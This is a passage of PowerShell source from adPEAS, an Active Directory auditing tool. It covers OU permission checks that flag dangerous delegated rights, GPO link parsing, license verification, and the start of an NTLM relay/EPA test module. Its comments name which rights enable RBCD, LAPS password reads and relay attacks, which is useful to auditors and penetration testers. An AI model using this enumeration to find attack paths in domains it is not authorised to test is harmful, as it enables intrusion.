                    $HasWriteOwner = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner

                    if ($HasWriteOwner) {
                        $scopeInfo = if ($IsAllObjectTypes) {
                            ""
                        } else {
                            $targetClass = Get-SchemaClassName -GUID $inheritedObjectType
                            if ($targetClass) { " on $targetClass objects" } else { "" }
                        }

                        $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
                        $Findings += [PSCustomObject]@{
                            CheckType     = "WriteOwner"
                            Right         = "WriteOwner (Take Ownership)$scopeInfo"
                            Principal     = $TrusteeName
                            SID           = $TrusteeSID
                            Severity      = $Severity
                            InheritedFrom = $InheritedFrom
                        }
                    }
                }

                # Check 2: Password Reset Rights
                # Note: Password reset only applies to User objects, so we check InheritedObjectType
                if ($CheckType -contains 'PasswordReset') {
                    $HasExtendedRight = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight

                    if ($HasExtendedRight -and $AppliesToUsers) {
                        # Check for Reset Password extended right (using central GUID lookup)
                        $passwordResetGUID = Get-ExtendedRightGUID -Name 'User-Force-Change-Password'
                        if ($ACE.ObjectType -eq $passwordResetGUID -or $ACE.ObjectType -eq [GUID]::Empty) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "PasswordReset"
                                Right         = "Reset Password (Extended Right)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                    }
                }

                # Check 3: Account Control (userAccountControl or User-Account-Restrictions Property Set)
                # Note: GUID::Empty is handled by generic "WriteProperty (All Properties)" above
                # userAccountControl exists on User AND Computer objects
                # User-Account-Restrictions Property Set (4c164200-...) includes UAC and is commonly delegated
                if ($CheckType -contains 'AccountControl') {
                    if ($HasWriteProperty -and -not $IsAllProperties -and ($AppliesToUsers -or $AppliesToComputers)) {
                        # Check direct userAccountControl attribute
                        if ($ACE.ObjectType -eq $PropertyGUIDs['userAccountControl']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "AccountControl"
                                Right         = "WriteProperty (userAccountControl)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                        # Check User-Account-Restrictions Property Set (includes UAC, pwdLastSet, accountExpires, etc.)
                        elseif ($ACE.ObjectType -eq $Script:PropertySetGUIDs['User-Account-Restrictions']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "AccountControl"
                                Right         = "WriteProperty (User-Account-Restrictions)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                    }
                }

                # Check 4: Group Membership (member attribute)
                # Note: GUID::Empty is handled by generic "WriteProperty (All Properties)" above
                # member attribute exists only on Group objects
                if ($CheckType -contains 'GroupMembership') {
                    if ($HasWriteProperty -and -not $IsAllProperties -and $AppliesToGroups) {
                        if ($ACE.ObjectType -eq $PropertyGUIDs['member']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "GroupMembership"
                                Right         = "WriteProperty (member)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                    }
                }

                # Check 5: SPN Modification (servicePrincipalName or Validated-SPN)
                # Note: GUID::Empty is handled by generic "WriteProperty (All Properties)" above
                # servicePrincipalName exists on User AND Computer objects
                # Validated-SPN (f3a64788-...) is commonly used for SPN delegation via Self right
                if ($CheckType -contains 'SPNModification') {
                    # Check WriteProperty on servicePrincipalName attribute
                    if ($HasWriteProperty -and -not $IsAllProperties -and ($AppliesToUsers -or $AppliesToComputers)) {
                        if ($ACE.ObjectType -eq $PropertyGUIDs['servicePrincipalName']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "SPNModification"
                                Right         = "WriteProperty (servicePrincipalName)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                        # Also check for WriteProperty on Validated-SPN GUID
                        # Note: This is unusual - WriteProperty on a Validated Write GUID effectively
                        # grants direct SPN modification without validation. Report as servicePrincipalName.
                        elseif ($ACE.ObjectType -eq $Script:ValidatedWriteGUIDs['Validated-SPN']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "SPNModification"
                                Right         = "WriteProperty (servicePrincipalName)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                    }
                    # Check Self right with Validated-SPN (validated write)
                    $HasSelf = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::Self
                    if ($HasSelf -and -not $IsAllProperties -and ($AppliesToUsers -or $AppliesToComputers)) {
                        if ($ACE.ObjectType -eq $Script:ValidatedWriteGUIDs['Validated-SPN']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "SPNModification"
                                Right         = "Self (Validated-SPN)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                    }
                }

                # Check 5b: DNS Host Name Modification (dNSHostName or DNS-Host-Name-Attributes Property Set)
                # Note: GUID::Empty is handled by generic "WriteProperty (All Properties)" above
                # dNSHostName exists on Computer objects - modification can enable machine account attacks
                # DNS-Host-Name-Attributes Property Set includes dNSHostName
                # Validated-DNS-Host-Name is commonly used for delegation via Self right
                if ($CheckType -contains 'DNSHostName') {
                    # Check WriteProperty on dNSHostName attribute
                    if ($HasWriteProperty -and -not $IsAllProperties -and $AppliesToComputers) {
                        if ($ACE.ObjectType -eq $PropertyGUIDs['dNSHostName']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "DNSHostName"
                                Right         = "WriteProperty (dNSHostName)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                        # Check for DNS-Host-Name-Attributes Property Set
                        elseif ($ACE.ObjectType -eq $Script:PropertySetGUIDs['DNS-Host-Name-Attributes']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "DNSHostName"
                                Right         = "WriteProperty (DNS-Host-Name-Attributes)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                        # Check for WriteProperty on Validated-DNS-Host-Name GUID
                        # Note: This is unusual - WriteProperty on a Validated Write GUID effectively
                        # grants direct dNSHostName modification without validation. Report as dNSHostName.
                        elseif ($ACE.ObjectType -eq $Script:ValidatedWriteGUIDs['Validated-DNS-Host-Name']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "DNSHostName"
                                Right         = "WriteProperty (dNSHostName)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                    }
                    # Check Self right with Validated-DNS-Host-Name (validated write)
                    $HasSelf = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::Self
                    if ($HasSelf -and -not $IsAllProperties -and $AppliesToComputers) {
                        if ($ACE.ObjectType -eq $Script:ValidatedWriteGUIDs['Validated-DNS-Host-Name']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "DNSHostName"
                                Right         = "Self (Validated-DNS-Host-Name)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                    }
                }

                # Check 6: Script Path (scriptPath)
                # Note: GUID::Empty is handled by generic "WriteProperty (All Properties)" above
                # scriptPath exists only on User objects
                if ($CheckType -contains 'ScriptPath') {
                    if ($HasWriteProperty -and -not $IsAllProperties -and $AppliesToUsers) {
                        if ($ACE.ObjectType -eq $PropertyGUIDs['scriptPath']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "ScriptPath"
                                Right         = "WriteProperty (scriptPath)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                    }
                }

                # Check 7: Delegation Rights
                # Note: GUID::Empty is handled by generic "WriteProperty (All Properties)" above
                # Delegation attributes exist on User AND Computer objects
                if ($CheckType -contains 'Delegation') {
                    if ($HasWriteProperty -and -not $IsAllProperties -and ($AppliesToUsers -or $AppliesToComputers)) {
                        # msDS-AllowedToDelegateTo (Constrained Delegation)
                        if ($ACE.ObjectType -eq $PropertyGUIDs['msDS-AllowedToDelegateTo']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "Delegation"
                                Right         = "WriteProperty (msDS-AllowedToDelegateTo)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }

                        # msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)
                        if ($ACE.ObjectType -eq $PropertyGUIDs['msDS-AllowedToActOnBehalfOfOtherIdentity']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "High" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "Delegation"
                                Right         = "WriteProperty (msDS-AllowedToActOnBehalfOfOtherIdentity)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                    }
                }

                # Check 8: LAPS Password Access
                # Note: LAPS attributes are only on Computer objects, so we check InheritedObjectType
                if ($CheckType -contains 'LAPS') {

                    $HasReadProperty = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::ReadProperty
                    $HasGenericAll = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
                    $HasExtendedRight = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight

                    if (($HasReadProperty -or $HasGenericAll -or $HasExtendedRight) -and $AppliesToComputers) {
                        # LAPS permissions on OUs can be configured in several ways:
                        # 1. Specific property read: ObjectType = LAPS-Property-GUID (most common for delegated LAPS read)
                        # 2. All properties read: ObjectType = Empty GUID (GenericAll or full ReadProperty)
                        # 3. Extended Right for Control Access (Windows LAPS specific)
                        #
                        # We need to check all scenarios to catch LAPS read permissions

                        # Use different variable name to avoid collision with $IsAllProperties
                        $lapsIsAllProperties = $IsAllProperties
                        $lapsPropertyFound = $false

                        # Legacy LAPS (ms-Mcs-AdmPwd) - GUID: E5C0983D-B71E-4F1D-B798-9B0F5ECAEEA3
                        $legacyLAPSMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['ms-Mcs-AdmPwd'].Guid)
                        if ($legacyLAPSMatch) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "LAPS"
                                Right         = "ReadProperty (ms-Mcs-AdmPwd - Legacy LAPS)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                            $lapsPropertyFound = $true
                        }

                        # Windows LAPS - Encrypted Password (most common)
                        # GUID: 0bf205b5-8bcb-4943-8413-52e492d7cf63
                        $encPwdMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-EncryptedPassword'].Guid)
                        if ($encPwdMatch) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "LAPS"
                                Right         = "ReadProperty (msLAPS-EncryptedPassword - Windows LAPS)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                            $lapsPropertyFound = $true
                        }

                        # Windows LAPS - Encrypted Password History
                        # GUID: 01b40040-aeb0-4bb4-ad1c-6b3e09ceeafc
                        $encHistMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-EncryptedPasswordHistory'].Guid)
                        if ($encHistMatch) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "LAPS"
                                Right         = "ReadProperty (msLAPS-EncryptedPasswordHistory - Windows LAPS)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                            $lapsPropertyFound = $true
                        }

                        # Windows LAPS - Plain Password (unencrypted mode)
                        # GUID: 5B47D60F-6090-40B2-9F37-2A4DE88F3063
                        $plainPwdMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-Password'].Guid)
                        if ($plainPwdMatch) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "LAPS"
                                Right         = "ReadProperty (msLAPS-Password - Windows LAPS)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                            $lapsPropertyFound = $true
                        }

                        # Windows LAPS - Current Password Version (less critical but indicates LAPS access)
                        # GUID: 5d848c52-82d7-4014-867b-714b3e4b6685
                        $versionMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-CurrentPasswordVersion'].Guid)
                        if ($versionMatch) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "Low" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "LAPS"
                                Right         = "ReadProperty (msLAPS-CurrentPasswordVersion - Windows LAPS)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                            $lapsPropertyFound = $true
                        }

                        # Windows LAPS - Password Expiration Time (less critical but indicates LAPS access)
                        # GUID: ec38fa45-104d-4ede-b3b1-4620e8594575
                        $expTimeMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-PasswordExpirationTime'].Guid)
                        if ($expTimeMatch) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "Low" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "LAPS"
                                Right         = "ReadProperty (msLAPS-PasswordExpirationTime - Windows LAPS)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                            $lapsPropertyFound = $true
                        }

                        # All Properties (GenericAll or ReadProperty with Empty GUID) - covers all LAPS types
                        # Only add if:
                        # 1. Not already caught by specific LAPS property checks above
                        # 2. NOT a broad group/legacy compat group (they have default "All Properties" read)
                        #    These groups should only be flagged if they have SPECIFIC LAPS property rights
                        if ($lapsIsAllProperties -and -not $lapsPropertyFound -and -not $skipAllPropertiesOnly) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "LAPS"
                                Right         = "ReadProperty (All Properties - includes LAPS)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                    }
                }

                # Check 9: Object Creation Rights
                # ObjectType specifies WHICH object class can be created (User, Computer, Group, etc.)
                if ($CheckType -contains 'ObjectCreation') {

                    $HasCreateChild = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::CreateChild
                    if ($HasCreateChild) {
                        # Determine what can be created based on ObjectType
                        # Empty ObjectType = "All Objects" (but may be limited by other mechanisms)
                        # Specific GUID = specific object class (User, Computer, Group, etc.)
                        $createTarget = if ($IsAllProperties) {
                            "All Objects"
                        } else {
                            # Try to resolve the schema class name
                            $className = Get-SchemaClassName -GUID $objectType
                            if ($className) {
                                # Title case for readability (user -> User, computer -> Computer)
                                (Get-Culture).TextInfo.ToTitleCase($className)
                            } else {
                                # Unknown GUID - show as-is
                                $objectType.ToString()
                            }
                        }

                        # Severity: Creating computers is more critical (can be used for RBCD attacks)
                        # "All Objects" includes Computer, so also High severity
                        $Severity = if ($IsPrivileged) {
                            "Info"
                        } elseif ($objectType -eq $SchemaClassGUIDs['computer'] -or $IsAllProperties) {
                            "High"  # Computer creation enables RBCD attacks
                        } else {
                            "Medium"
                        }

                        $Findings += [PSCustomObject]@{
                            CheckType     = "ObjectCreation"
                            Right         = "CreateChild ($createTarget)"
                            Principal     = $TrusteeName
                            SID           = $TrusteeSID
                            Severity      = $Severity
                            InheritedFrom = $InheritedFrom
                        }
                    }
                }

                # Check 10: GPO Linking Rights
                # Note: GUID::Empty is handled by generic "WriteProperty (All Properties)" above
                # gPLink is an attribute of the OU itself, NOT child objects
                # So InheritedObjectType must be empty (applies to the OU) or organizationalUnit
                if ($CheckType -contains 'GPOLinking') {
                    $AppliesToOU = $IsAllObjectTypes -or ($inheritedObjectType -eq $SchemaClassGUIDs['organizationalUnit'])
                    if ($HasWriteProperty -and -not $IsAllProperties -and $AppliesToOU) {
                        if ($ACE.ObjectType -eq $PropertyGUIDs['gPLink']) {
                            $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
                            $Findings += [PSCustomObject]@{
                                CheckType     = "GPOLinking"
                                Right         = "WriteProperty (gPLink)"
                                Principal     = $TrusteeName
                                SID           = $TrusteeSID
                                Severity      = $Severity
                                InheritedFrom = $InheritedFrom
                            }
                        }
                    }
                }
            }

            $result = [PSCustomObject]@{
                OU       = $DistinguishedName
                Findings = $Findings
            }

            # Cache full-scan results for cross-module reuse
            if ($isFullScan) {
                $Script:OUPermissionsCache[$cacheKey] = $result
            }

            return $result

        } catch {
            Write-Log "[Get-OUPermissions] Error analyzing OU '$DistinguishedName': $_"
            return $null
        }
    }

    end {
        Write-Log "[Get-OUPermissions] ACL analysis completed"
    }
}




# ----- Get-GPOLinkage.ps1 -----

function Get-GPOLinkage {
    <#
    .SYNOPSIS
    Retrieves GPO linkage information (which OUs/Domains/Sites link to which GPOs).

    .DESCRIPTION
    Queries LDAP for all objects with gPLink attribute to determine where GPOs are applied.
    Returns a hashtable mapping GPO GUIDs to their linked locations.

    GPO Links in Active Directory:
    - Stored in 'gPLink' attribute on OU/Domain/Site objects
    - Format: [LDAP://cn={GUID},cn=policies,cn=system,DC=domain,DC=com;0]
    - Link Options: 0=Enabled, 1=Disabled, 2=Enforced, 3=Disabled+Enforced

    .EXAMPLE
    $linkage = Get-GPOLinkage
    $linkage["{GUID}"]  # Returns array of OUs where this GPO is linked

    .OUTPUTS
    Hashtable with GPO GUID as key and array of linked locations as value.

    .NOTES
    Author: Alexander Sturz (@_61106960_)
    #>

    [CmdletBinding()]
    param()

    begin {
        Write-Log "[Get-GPOLinkage] Starting GPO linkage enumeration"
    }

    process {
        # Return cached result if available (GPO linkage is static during a session)
        if ($Script:CachedGPOLinkage) {
            Write-Log "[Get-GPOLinkage] Returning cached GPO linkage data ($($Script:CachedGPOLinkage.Count) GPOs)"
            return $Script:CachedGPOLinkage
        }

        # Internal helper - caller must ensure LDAP connection exists
        # UNIFIED: Check for LdapConnection (works for both LDAP and LDAPS)
        if (-not $Script:LdapConnection) {
            Show-NoSessionError -Context "Get-GPOLinkage"
            Write-Log "[Get-GPOLinkage] No LDAP connection - returning null"
            return $null
        }

        # Get Domain DN from LDAPContext
        $domainDN = $Script:LDAPContext.DomainDN
        $configDN = $Script:LDAPContext.ConfigurationDN

        if (-not $domainDN) {
            Write-Error "Domain DN not available in LDAPContext"
            return $null
        }

        Write-Log "[Get-GPOLinkage] Domain DN: $domainDN"
        Write-Log "[Get-GPOLinkage] Configuration DN: $configDN"

        # Hashtable: GPOGUID -> Array of linked OUs/Domains/Sites
        $gpoLinkage = @{}

        try {
            # ===== Search for all objects with gPLink attribute =====
            # This includes: OUs, Domain root, Sites
            # UNIFIED: Use Invoke-LDAPSearch instead of DirectorySearcher

            Write-Log "[Get-GPOLinkage] Searching for objects with gPLink attribute..."

            $results = Invoke-LDAPSearch -Filter "(gPLink=*)" -Properties "distinguishedName","gPLink","name","objectClass"

            if (-not $results) {
                Write-Log "[Get-GPOLinkage] No objects with GPO links found"
                return $gpoLinkage
            }

            Write-Log "[Get-GPOLinkage] Found $($results.Count) object(s) with GPO links"

            foreach ($result in $results) {
                $dn = $result.distinguishedName
                $gPLink = $result.gPLink
                $name = if ($result.name) { $result.name } else { $dn }
                $objectClass = if ($result.objectClass) { if ($result.objectClass -is [array]) { $result.objectClass[-1] } else { $result.objectClass } } else { "Unknown" }

                Write-Log "[Get-GPOLinkage] Processing: $dn"
                Write-Log "[Get-GPOLinkage] gPLink: $gPLink"

                # Parse gPLink attribute, Format: [LDAP://cn={GUID},cn=policies,cn=system,DC=domain,DC=com;0][LDAP://cn={GUID2},...;1]
                $guidPattern = '\{([0-9A-Fa-f\-]{36})\}'
                $matches = [regex]::Matches($gPLink, $guidPattern)

                # Compute link order per gPLink container: last non-disabled entry = link order 1 (highest priority)
                # First pass: collect enabled GUIDs in forward order to determine their positions
                $enabledGUIDs = [System.Collections.Generic.List[string]]::new()
                foreach ($m in $matches) {
                    $g = "{$($m.Groups[1].Value.ToUpper())}"
                    $lp = '(?i)' + [regex]::Escape($g) + ';(\d+)'
                    $lo = if ($gPLink -match $lp) { [int]$Matches[1] } else { 0 }
                    if (($lo -band 1) -eq 0) { $enabledGUIDs.Add($g) }  # bit 0 = disabled
                }
                # Assign link order: last enabled entry = 1 (highest priority)
                $linkOrderMap = @{}
                $totalEnabled = $enabledGUIDs.Count
                for ($idx = 0; $idx -lt $totalEnabled; $idx++) {
                    $linkOrderMap[$enabledGUIDs[$idx]] = $totalEnabled - $idx
                }

                foreach ($match in $matches) {
                    # Normalize GUID to uppercase for consistent hashtable key matching
                    # GPO Name attribute uses uppercase, gPLink may use lowercase
                    $gpoGUID = "{$($match.Groups[1].Value.ToUpper())}"

                    Write-Log "[Get-GPOLinkage] Linked GPO: $gpoGUID"

                    # Determine link status (enabled/disabled/enforced)
                    # Use case-insensitive match since gPLink may have mixed case GUIDs
                    $linkPattern = '(?i)' + [regex]::Escape($gpoGUID) + ';(\d+)'
                    if ($gPLink -match $linkPattern) {
                        $linkOptions = [int]$Matches[1]
                    }
                    else {
                        $linkOptions = 0  # Default: Enabled
                    }

                    # Decode link options
                    $isDisabled = ($linkOptions -band 1) -ne 0
                    $isEnforced = ($linkOptions -band 2) -ne 0

                    $linkStatus = if ($isDisabled) {
                        "Disabled"
                    } elseif ($isEnforced) {
                        "Enforced"
                    } else {
                        "Enabled"
                    }

                    # Determine scope (Domain, OU, Site)
                    $scope = "OU"
                    if ($dn -eq $domainDN) {
                        $scope = "Domain"
                    }
                    elseif ($dn -match "CN=Sites,CN=Configuration") {
                        $scope = "Site"
                    }

                    # Create link object
                    # LinkOrder: 1 = highest priority within this container (last entry in gPLink string)
                    #            $null = disabled link (has no effective link order)
                    $linkInfo = [PSCustomObject]@{
                        DistinguishedName = $dn
                        Name = $name
                        Scope = $scope
                        LinkStatus = $linkStatus
                        IsEnforced = $isEnforced
                        IsDisabled = $isDisabled
                        ObjectClass = $objectClass
                        LinkOrder = if ($linkOrderMap.ContainsKey($gpoGUID)) { $linkOrderMap[$gpoGUID] } else { $null }
                    }

                    # Add to hashtable
                    if (-not $gpoLinkage.ContainsKey($gpoGUID)) {
                        $gpoLinkage[$gpoGUID] = @()
                    }

                    $gpoLinkage[$gpoGUID] += $linkInfo
                }
            }

            # No need to Dispose - Invoke-LDAPSearch handles cleanup internally

            Write-Log "[Get-GPOLinkage] GPO linkage enumeration complete. Found links for $($gpoLinkage.Count) GPO(s)"

            # Cache result for subsequent calls within the same session
            $Script:CachedGPOLinkage = $gpoLinkage
        }
        catch {
            Write-Error "Error during GPO linkage enumeration: $_"
            Write-Log $_.Exception.StackTrace
        }

        return $gpoLinkage
    }

    end {
        Write-Log "[Get-GPOLinkage] GPO linkage enumeration finished"
    }
}



# ----- Test-adPEASLicense.ps1 -----

<#
.SYNOPSIS
    Validates an adPEAS license file using RSA-SHA256 signature verification.

.DESCRIPTION
    Verifies the RSA-SHA256 signature of a license JSON string and checks the expiry date.
    The public key is embedded in this module and must match the private key used for signing.

    Returns a result object with validation status, licensee info, and display message.

.PARAMETER LicenseJson
    The license input - accepts either:
    - A file path to a .json license file
    - A raw JSON string
    Expected JSON format: {"Licensee":"...","ValidUntil":"yyyy-MM-dd","Signature":"base64..."}

.EXAMPLE
    Test-adPEASLicense -LicenseJson .\license.json
    Validates the license file at the given path.

.EXAMPLE
    $json = Get-Content .\license.json -Raw
    $result = Test-adPEASLicense -LicenseJson $json
    if ($result.IsValid -and -not $result.Expired) {
        Write-Host $result.Message
    }

.OUTPUTS
    PSCustomObject with properties:
    - IsValid    [bool]     : Signature verification passed
    - Licensee   [string]   : Licensee name (null if invalid)
    - ValidUntil [string]   : Expiry date as yyyy-MM-dd (null if invalid)
    - Expired    [bool]     : Whether license has expired (null if invalid)
    - Message    [string]   : Display text for disclaimer

.NOTES
    Author: Alexander Sturz (@_61106960_)
    The public key below is embedded at build time and used for signature verification.
#>

# RSA public key for license verification (XML format, embedded at build time)
$Script:adPEASPublicKey = @"
<RSAKeyValue><Modulus></Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
"@

function Test-adPEASLicense {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$LicenseJson
    )

    process {
        try {
            # If input looks like a file path, read the file content
            if ($LicenseJson -notmatch '^\s*\{' -and (Test-Path $LicenseJson -ErrorAction SilentlyContinue)) {
                $LicenseJson = Get-Content $LicenseJson -Raw -Encoding UTF8
            }

            # Parse JSON
            $license = $LicenseJson | ConvertFrom-Json

            # Validate required fields
            if (-not $license.Licensee -or -not $license.ValidUntil -or -not $license.Signature) {
                return [PSCustomObject]@{
                    IsValid    = $false
                    Licensee   = $null
                    ValidUntil = $null
                    Expired    = $null
                    Message    = "Invalid license format"
                }
            }

            # Check if public key is configured
            if ($Script:adPEASPublicKey -match 'PLACEHOLDER') {
                return [PSCustomObject]@{
                    IsValid    = $false
                    Licensee   = $null
                    ValidUntil = $null
                    Expired    = $null
                    Message    = "License validation not configured"
                }
            }

            # Verify RSA-SHA256 signature
            $rsa = $null
            try {
                $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
                $rsa.FromXmlString($Script:adPEASPublicKey)

                # Reconstruct signed payload: "Licensee|ValidUntil"
                $payload = "$($license.Licensee)|$($license.ValidUntil)"
                $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
                $signatureBytes = [Convert]::FromBase64String($license.Signature)

                # Use .NET Framework compatible API (PowerShell 5.1)
                # RSACryptoServiceProvider.VerifyData(byte[] data, object halg, byte[] signature)
                $isValidSignature = $rsa.VerifyData($payloadBytes, "SHA256", $signatureBytes)

                if (-not $isValidSignature) {
                    return [PSCustomObject]@{
                        IsValid    = $false
                        Licensee   = $null
                        ValidUntil = $null
                        Expired    = $null
                        Message    = "Invalid license signature"
                    }
                }
            }
            finally {
                if ($rsa) { $rsa.Dispose() }
            }

            # Parse and check expiry date
            $validUntilDate = [datetime]::ParseExact(
                $license.ValidUntil,
                "yyyy-MM-dd",
                [System.Globalization.CultureInfo]::InvariantCulture
            )
            $isExpired = (Get-Date).Date -gt $validUntilDate

            # Build display message
            $displayMessage = if ($isExpired) {
                "License expired on $($license.ValidUntil) (Licensee: $($license.Licensee))"
            }
            else {
                "Licensed to $($license.Licensee) - Valid until $($license.ValidUntil)"
            }

            return [PSCustomObject]@{
                IsValid    = $true
                Licensee   = $license.Licensee
                ValidUntil = $license.ValidUntil
                Expired    = $isExpired
                Message    = $displayMessage
            }
        }
        catch {
            return [PSCustomObject]@{
                IsValid    = $false
                Licensee   = $null
                ValidUntil = $null
                Expired    = $null
                Message    = "License validation error: $($_.Exception.Message)"
            }
        }
    }
}



# ----- NTLM-HTTP.ps1 -----

<#
.SYNOPSIS
    NTLM over HTTP authentication helpers for Extended Protection for Authentication (EPA) testing.

.DESCRIPTION
    Implements NTLM Type1/Type2/Type3 message handling over HTTP to test whether Extended Protection
    for Authentication (EPA/Channel Binding) is enabled.

    EPA binds NTLM authentication to the TLS channel, preventing relay attacks.
    This module tests EPA by attempting NTLM auth without a Channel Binding Token (CBT).

    If EPA is enabled:  Auth fails (401) even with valid dummy credentials
    If EPA is disabled: Auth proceeds (may fail for other reasons, but not due to CBT)

    Success Flag Semantics:
    - Success = $true:  EPA test completed (result is in EPAEnabled)
    - Success = $false: EPA test could not be completed (network error, no NTLM, etc.)
    - EPAEnabled = $true:  EPA is active (secure against NTLM relay)
    - EPAEnabled = $false: EPA is NOT active (vulnerable to NTLM relay)
    - EPAEnabled = $null:  EPA status could not be determined or not applicable

    Timeout Semantics:
    - TimeoutSeconds is a per-operation timeout, not a total timeout
